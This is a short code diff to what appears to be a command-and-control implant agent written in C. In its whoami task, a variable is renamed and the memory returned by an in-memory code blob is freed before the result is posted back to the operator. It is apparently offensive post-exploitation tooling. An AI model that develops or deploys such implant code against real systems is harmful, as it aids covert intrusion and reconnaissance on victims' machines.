@@ -112,10 +112,11 @@ void agent_whoami(AgentState *state, TaskInfo *task) {
 	}
 	
 	WHOAMI_PICO entrypoint = (WHOAMI_PICO) pico.entrypoint;
-	char *username = entrypoint();
+	char *whoami_output = entrypoint();
 	
-	if (username != NULL) {
-		agent_post(state, task, username, STR(STATUS_SUCCESS));
+	if (whoami_output != NULL) {
+		agent_post(state, task, whoami_output, STR(STATUS_SUCCESS));
+		KERNEL32$VirtualFree(whoami_output, 0, MEM_RELEASE);
 	} else {
 		agent_post(state, task, "<UNKNOWN>", STR(STATUS_SUCCESS));
 	}
